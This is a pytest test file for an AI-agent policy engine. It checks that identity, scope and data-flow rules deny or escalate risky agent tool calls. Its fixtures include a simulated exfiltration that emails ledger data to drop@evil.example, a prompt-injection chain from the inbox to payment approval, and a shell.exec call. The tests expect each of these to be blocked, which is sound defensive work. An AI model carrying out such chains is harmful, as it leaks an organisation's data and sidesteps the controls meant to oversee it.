from pathlib import Path

import pytest

from aig import Engine, PolicyError, Session, load_policy, parse_policy
from aig.sim import Enterprise

POLICY = load_policy(Path(__file__).parent.parent / "examples" / "enterprise.yaml")


def run(agent, principal, calls):
    """Evaluate a sequence of calls, recording allowed ones. Returns the decisions."""
    eng, s, ent = Engine(POLICY), Session(agent, principal), Enterprise()
    out = []
    for tool, args in calls:
        d = eng.evaluate(s, tool, args)
        if d.allowed:
            eng.record(s, tool, args)
            eng.observe(s, tool, args, ent.call(tool, args)["content"][0]["text"])
        out.append(d)
    return out


# ---- identity -------------------------------------------------------------
def test_unknown_agent_denied():
    [d] = run("rogue", "user:a@corp.example", [("docs.search", {})])
    assert d.action == "deny" and "identity:unknown-agent" in d.rules


def test_confused_deputy_principal_denied():
    [d] = run("plant-monitor", "user:intern@corp.example", [("ot.read_sensor", {})])
    assert d.action == "deny" and "identity:principal" in d.rules


def test_undeclared_tool_denied():
    [d] = run("expense-bot", "group:finance", [("shell.exec", {"cmd": "id"})])
    assert d.action == "deny" and "identity:unknown-tool" in d.rules


# ---- intent scope ---------------------------------------------------------
def test_in_scope_allowed_with_explanation():
    [d] = run("expense-bot", "group:finance", [("finance.query_ledger", {})])
    assert d.allowed and "declared scope" in d.reasons[0]


def test_out_of_purpose_denied_and_names_purpose():
    [d] = run("expense-bot", "group:finance", [("hr.lookup_employee", {})])
    assert d.action == "deny" and "Reconcile employee expense reports" in d.reasons[0]


def test_explicit_deny_beats_everything():
    [d] = run("research-assistant", "user:a@corp.example", [("finance.query_ledger", {})])
    assert d.action == "deny" and d.rules == ("agent:research-assistant:deny",)


def test_high_risk_needs_approval():
    [d] = run("plant-monitor", "group:ot-operators", [("ot.set_point", {"value": 90})])
    assert d.action == "require_approval"


# ---- data flow ------------------------------------------------------------
def test_internal_email_after_finance_read_ok():
    _, d = run("expense-bot", "group:finance", [
        ("finance.query_ledger", {}),
        ("email.send", {"to": "cfo@corp.example"}),
    ])
    assert d.allowed and d.sink == "internal"


def test_exfil_via_allowed_email_blocked():
    """Each call is individually allowed; the chain is not."""
    _, d = run("expense-bot", "group:finance", [
        ("finance.query_ledger", {}),
        ("email.send", {"to": "drop@evil.example", "body": "TX-1042 Contoso Cloud 72300"}),
    ])
    assert d.action == "deny" and "flow:no-finance-egress" in d.rules
    assert "finance.query_ledger" in d.reasons[0] and "'tx1042'" in d.reasons[0]  # what leaked, from where


def test_one_external_recipient_makes_call_external():
    _, d = run("expense-bot", "group:finance", [
        ("finance.query_ledger", {}),
        ("email.send", {"to": ["cfo@corp.example", "drop@evil.example"], "body": "TX-1042"}),
    ])
    assert d.action == "deny"


def test_external_email_fine_before_sensitive_read():
    [d] = run("expense-bot", "group:finance", [("email.send", {"to": "vendor@supplier.example"})])
    assert d.allowed and d.sink == "external"


def test_prompt_injection_cannot_drive_high_risk_action():
    _, d = run("expense-bot", "group:finance", [
        ("email.read_inbox", {}),
        ("finance.approve_payment", {"id": "TX-1042"}),
    ])
    assert d.action == "deny" and "flow:untrusted-no-high-risk" in d.rules


def test_internal_docs_to_web_needs_approval():
    _, d = run("research-assistant", "user:a@corp.example", [
        ("docs.search", {"q": "roadmap"}),
        ("web.fetch", {"url": "https://x.example/?q=roadmap"}),
    ])
    assert d.action == "require_approval"


def test_denied_call_does_not_taint_session():
    eng, s = Engine(POLICY), Session("research-assistant", "user:a@corp.example")
    d = eng.evaluate(s, "finance.query_ledger", {})
    assert not d.allowed
    assert "finance" not in s.labels


# ---- policy validation ----------------------------------------------------
@pytest.mark.parametrize("doc,msg", [
    ({"version": 2}, "version"),
    ({"version": 1, "agents": [{"id": "a", "on_behalf_of": "x"}]}, "purpose"),
    ({"version": 1, "agents": [{"id": "a", "purpose": "p"}]}, "on_behalf_of"),
    ({"version": 1, "flows": [{"from": "a", "to": "b", "action": "maybe"}]}, "action"),
    ({"version": 1, "default": "yolo"}, "default"),
])
def test_bad_policies_rejected(doc, msg):
    with pytest.raises(PolicyError, match=msg):
        parse_policy(doc)
